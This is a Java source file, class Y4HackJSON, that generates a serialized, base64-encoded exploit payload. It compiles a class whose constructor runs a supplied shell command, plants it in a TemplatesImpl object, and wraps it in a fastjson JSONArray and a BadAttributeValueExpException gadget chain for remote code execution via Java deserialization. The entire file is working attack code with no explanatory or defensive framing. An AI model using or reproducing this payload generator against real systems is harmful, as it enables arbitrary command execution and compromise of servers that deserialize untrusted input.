package Uniti;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class Y4HackJSON {
    public void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public byte[] genPayload(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"" + cmd + "\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(49);
        return clazz.toBytecode();
    }

    public String Jsoncode(String cmd) throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", new byte[][]{genPayload(cmd)}); //执行的命令
        setValue(templates, "_name", "1");
        setValue(templates, "_tfactory", null);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);
        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setValue(bd, "val", jsonArray);
        HashMap hashMap = new HashMap();
        hashMap.put(templates, bd);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream);
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.flush();
        objectOutputStream.close();
        byte[] serializedObject = outputStream.toByteArray();
        String base64String = Base64.getEncoder().encodeToString(serializedObject);
//        System.out.println(base64String);
        return base64String;
    }
}
